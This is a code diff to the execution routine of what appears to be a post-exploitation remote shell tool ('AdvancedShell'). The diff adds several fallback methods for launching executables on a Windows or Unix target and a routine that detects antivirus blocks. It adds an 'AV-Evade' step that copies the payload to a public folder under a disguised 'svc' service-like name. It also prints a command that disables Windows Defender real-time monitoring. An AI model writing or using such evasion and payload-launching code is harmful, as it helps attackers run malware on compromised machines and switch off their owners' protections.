@@ -685,37 +685,67 @@ class AdvancedShell:
     def post_exec(self,filepath,args=''):
         """Smart executable launcher — tries multiple execution methods."""
         fp=filepath.replace('\\','/') if self.target_os=='windows' else filepath
+        # Build full path if relative
+        if self.target_os=='windows' and ':' not in fp and not fp.startswith('/') and not fp.startswith('\\\\'):
+            cwd=(self.current_dir or '').replace('\\','/')
+            full=cwd.rstrip('/')+'/'+fp if cwd else fp
+        else:
+            full=fp
+        print(f"  {C}Path:{W} {full}")
+        # Check file exists
+        if self.target_os=='windows':
+            chk=self.execute(f'if exist "{full}" (echo FILE_OK) else (echo FILE_MISSING)')
+            if chk and 'FILE_MISSING' in chk:
+                print(f"  {R}[!] File not found: {full}{W}");return
+        WMIC_CODES={0:'Success',2:'Access Denied',3:'Insufficient Privilege',8:'Unknown Failure',9:'Path Not Found',21:'Invalid Parameter'}
         methods=[]
         if self.target_os=='windows':
             methods=[
-                ('Direct',f'"{fp}" {args} 2>&1'),
-                ('cmd /c',f'cmd /c "{fp}" {args} 2>&1'),
-                ('PowerShell',f'powershell -c "& \'{fp}\' {args}" 2>&1'),
-                ('WMIC',f'wmic process call create "{fp} {args}" 2>&1'),
-                ('Background',f'start /b "" "{fp}" {args} & echo EXEC_STARTED'),
+                ('cmd /c (full)',f'cmd /c "{full}" {args} 2>&1'),
+                ('cmd /c (.\\)',f'cmd /c ".\\{fp}" {args} 2>&1'),
+                ('PowerShell',f'powershell -c "& \'{full}\' {args}" 2>&1'),
+                ('WMIC',f'wmic process call create "{full} {args}" 2>&1'),
+                ('Background',f'start /b "" "{full}" {args} & timeout /t 2 >nul & echo EXEC_STARTED'),
             ]
         else:
             methods=[
-                ('Direct',f'"{fp}" {args} 2>&1'),
-                ('chmod+run',f'chmod +x "{fp}" && "{fp}" {args} 2>&1'),
-                ('sh -c',f'sh -c "{fp} {args}" 2>&1'),
-                ('Background',f'nohup "{fp}" {args} >/dev/null 2>&1 & echo EXEC_STARTED'),
+                ('Direct',f'"{full}" {args} 2>&1'),
+                ('chmod+run',f'chmod +x "{full}" && "{full}" {args} 2>&1'),
+                ('sh -c',f'sh -c "\'{full}\' {args}" 2>&1'),
+                ('Background',f'nohup "{full}" {args} >/dev/null 2>&1 & echo EXEC_STARTED'),
             ]
         for name,cmd in methods:
             print(f"  {Y}[*] Trying {name}...{W}",end=' ',flush=True)
             o=self.execute(cmd)
             if o and '[-]' not in o:
-                if 'EXEC_STARTED' in o:
-                    print(f"{G}started in background{W}")
-                elif o.strip():
-                    print(f"{G}got output{W}")
-                    print(o)
-                else:
-                    print(f"{Y}no output (may have run){W}")
-                return
-            else:
-                print(f"{R}failed{W}")
-        print(f"{R}[!] All execution methods failed. Check AV with .av{W}")
+                if 'ReturnValue' in o:
+                    m=re.search(r'ReturnValue\s*=\s*(\d+)',o)
+                    if m:
+                        rv=int(m.group(1))
+                        meaning=WMIC_CODES.get(rv,f'Error {rv}')
+                        if rv==0:print(f"{G}process created ✓{W}");return
+                        else:print(f"{R}{meaning} (code {rv}){W}");continue
+                if 'EXEC_STARTED' in o:print(f"{G}started in background{W}");return
+                ol=o.lower()
+                if 'virus' in ol or 'threat' in ol or 'quarantine' in ol or 'blocked' in ol:
+                    print(f"{R}BLOCKED by AV{W}");print(f"    {o.strip()}");continue
+                if o.strip():print(f"{G}got output{W}");print(o);return
+                else:print(f"{Y}ran (no output){W}");return
+            else:print(f"{R}failed{W}")
+        # AV evasion: copy with random name
+        if self.target_os=='windows':
+            import random,string
+            rname='svc'+''.join(random.choices(string.digits,k=4))+'.exe'
+            rcopy='c:/users/public/'+rname
+            print(f"  {Y}[*] AV-Evade: copy as {rname}...{W}",end=' ',flush=True)
+            self.execute(f'copy /Y "{full}" "{rcopy}" >nul 2>&1')
+            o=self.execute(f'start /b "" "{rcopy}" {args} & timeout /t 2 >nul & echo EXEC_STARTED')
+            if o and 'EXEC_STARTED' in o:
+                print(f"{G}started as {rname}{W}");return
+            self.execute(f'del /f "{rcopy}" >nul 2>&1')
+            print(f"{R}failed{W}")
+        print(f"\n{R}[!] All methods failed. Defender is likely blocking.{W}")
+        print(f"{Y}  Try: .av | .bg {filepath} | powershell Set-MpPreference -DisableRealtimeMonitoring $true{W}")
 
     def post_av(self):
         """Check antivirus status."""
